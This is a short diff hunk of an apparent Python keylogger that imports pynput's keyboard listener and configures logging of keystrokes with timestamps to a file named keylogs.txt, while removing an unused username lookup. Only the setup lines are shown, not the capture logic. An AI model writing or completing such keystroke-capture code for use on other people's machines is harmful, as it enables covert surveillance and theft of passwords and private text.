@@ -1,9 +1,5 @@
 from pynput.keyboard import Listener
-
-import os
 import logging
-
-username = os.getlogin()
 
 logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
